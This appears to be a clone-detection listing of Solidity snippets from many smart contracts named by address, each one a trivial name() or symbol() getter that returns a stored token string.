<source file="systems/source-code/0x648a2725f5f2Fc16D9c32861cb3045A0D64fF718.sol" startline="65" endline="67" pcid="3789">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="52" endline="54" pcid="1520">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="54" endline="56" pcid="4626">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="54" endline="56" pcid="2699">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="71" endline="73" pcid="4270">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="54" endline="56" pcid="6210">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="70" endline="72" pcid="7804">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="72" endline="74" pcid="4476">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="70" endline="72" pcid="2626">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x587c98e29d4b92f58fa763a7c3b08613fc5ec66b.sol" startline="44" endline="46" pcid="3333">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="51" endline="53" pcid="5429">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="56" endline="58" pcid="77">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="57" endline="59" pcid="1663">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="34" endline="36" pcid="782">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="70" endline="72" pcid="8671">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="68" endline="70" pcid="1221">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="72" endline="74" pcid="6199">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="68" endline="70" pcid="3549">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="70" endline="72" pcid="6970">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="63" endline="65" pcid="9075">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="54" endline="56" pcid="1997">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="53" endline="55" pcid="2284">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="52" endline="54" pcid="2938">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="69" endline="71" pcid="6165">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="51" endline="53" pcid="4251">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xea0C5622A2E88392b1edb53e495a28491aC11fBA.sol" startline="72" endline="74" pcid="8469">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="51" endline="53" pcid="6375">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="54" endline="56" pcid="2893">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="52" endline="54" pcid="4487">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xA2F5f226ab0cC49602dFf5e178AC9bC978869395.sol" startline="66" endline="68" pcid="5864">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="51" endline="53" pcid="6681">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="51" endline="53" pcid="5655">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="73" endline="75" pcid="578">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="64" endline="66" pcid="7724">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="54" endline="56" pcid="4641">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="66" endline="68" pcid="926">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="51" endline="53" pcid="1157">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="140" endline="142" pcid="6729">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="51" endline="53" pcid="288">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="52" endline="54" pcid="6360">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="54" endline="56" pcid="2622">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="51" endline="53" pcid="4868">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="50" endline="52" pcid="2987">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="67" endline="69" pcid="8229">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="52" endline="54" pcid="2797">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="394" endline="396" pcid="3027">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="49" endline="51" pcid="6345">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xDBc4b8F7D65167C5f44426dbb95Ec8921F629386.sol" startline="67" endline="69" pcid="7789">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="69" endline="71" pcid="4606">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="51" endline="53" pcid="5526">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="67" endline="69" pcid="7929">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="70" endline="72" pcid="1682">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="67" endline="69" pcid="5373">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="67" endline="69" pcid="5433">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="70" endline="72" pcid="1581">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="142" endline="144" pcid="7079">
    function name() public view returns (string memory) {
        return _name;
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="51" endline="53" pcid="2669">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="51" endline="53" pcid="8225">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="67" endline="69" pcid="5418">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="68" endline="70" pcid="1183">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="71" endline="73" pcid="990">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="49" endline="51" pcid="8030">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="52" endline="54" pcid="1275">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="71" endline="73" pcid="730">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="67" endline="69" pcid="3471">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="670" endline="672" pcid="2210">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="56" endline="58" pcid="47">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="54" endline="56" pcid="6225">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="51" endline="53" pcid="7261">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="72" endline="74" pcid="4591">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="54" endline="56" pcid="8300">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="50" endline="52" pcid="4042">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="51" endline="53" pcid="2761">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="65" endline="67" pcid="3344">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="71" endline="73" pcid="8707">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="52" endline="54" pcid="5182">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xE363D20dfC0e68fb1da7669216826010275aE6dc.sol" startline="66" endline="68" pcid="8244">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="124" endline="126" pcid="7360">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="50" endline="52" pcid="6131">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="70" endline="72" pcid="1244">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="54" endline="56" pcid="4398">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="55" endline="57" pcid="9125">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="51" endline="53" pcid="5167">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="67" endline="69" pcid="3148">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="54" endline="56" pcid="6562">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="73" endline="75" pcid="8737">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="52" endline="54" pcid="3645">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="67" endline="69" pcid="1035">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="54" endline="56" pcid="2833">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x7c947C432A8b47feD452DbE026cc6648ad6a2cC6.sol" startline="70" endline="72" pcid="4660">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="68" endline="70" pcid="1524">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="70" endline="72" pcid="6214">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="67" endline="69" pcid="6304">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="68" endline="70" pcid="715">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="66" endline="68" pcid="3324">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="70" endline="72" pcid="3564">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="52" endline="54" pcid="5212">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="54" endline="56" pcid="1194">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="57" endline="59" pcid="8733">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="65" endline="67" pcid="896">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="51" endline="53" pcid="8892">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="52" endline="54" pcid="6245">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="68" endline="70" pcid="5575">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="73" endline="75" pcid="403">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="68" endline="70" pcid="418">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x95b34d9c10e8569d9fd1e08001cfd84a59226ab9.sol" startline="44" endline="46" pcid="5457">
    function name() public pure returns (string memory) {
        return NAME;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="52" endline="54" pcid="6275">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="123" endline="125" pcid="3156">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="66" endline="68" pcid="4842">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="68" endline="70" pcid="3971">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="67" endline="69" pcid="5704">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="71" endline="73" pcid="4001">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x49D141A0B0190d120039F603F434F51a39f33D6c.sol" startline="52" endline="54" pcid="2781">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="65" endline="67" pcid="5333">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="68" endline="70" pcid="7457">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="51" endline="53" pcid="3452">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="67" endline="69" pcid="277">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="54" endline="56" pcid="4702">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="50" endline="52" pcid="356">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="51" endline="53" pcid="5826">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="66" endline="68" pcid="6264">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="54" endline="56" pcid="7632">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="70" endline="72" pcid="7487">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="53" endline="55" pcid="937">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="126" endline="128" pcid="7075">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="59" endline="61" pcid="8763">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="51" endline="53" pcid="5414">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="125" endline="127" pcid="3736">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="52" endline="54" pcid="243">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="69" endline="71" pcid="3253">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="70" endline="72" pcid="330">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="70" endline="72" pcid="463">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="67" endline="69" pcid="3926">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="67" endline="69" pcid="1131">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="67" endline="69" pcid="6810">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="49" endline="51" pcid="4281">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="51" endline="53" pcid="5369">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="51" endline="53" pcid="6936">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="124" endline="126" pcid="6725">
    function symbol() public view  returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="51" endline="53" pcid="8580">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="71" endline="73" pcid="2464">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="66" endline="68" pcid="4827">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="50" endline="52" pcid="4838">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="53" endline="55" pcid="690">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x0555a666a7b5784f5bdbe6f6f64de402df661ee1.sol" startline="48" endline="50" pcid="151">
    function symbol() public pure returns (string memory) {
        return SYMBOL;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="70" endline="72" pcid="9229">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="54" endline="56" pcid="1910">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="75" endline="77" pcid="909">
    function symbol() public view returns (string memory) {
        return _symbol;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="51" endline="53" pcid="5700">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="66" endline="68" pcid="3905">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="55" endline="57" pcid="986">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="54" endline="56" pcid="3422">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="54" endline="56" pcid="7970">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="66" endline="68" pcid="1020">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="53" endline="55" pcid="7033">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="54" endline="56" pcid="5444">
    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="75" endline="77" pcid="8767">
    function name() public view returns (string memory) {
        return tokenName;
    }
</source>
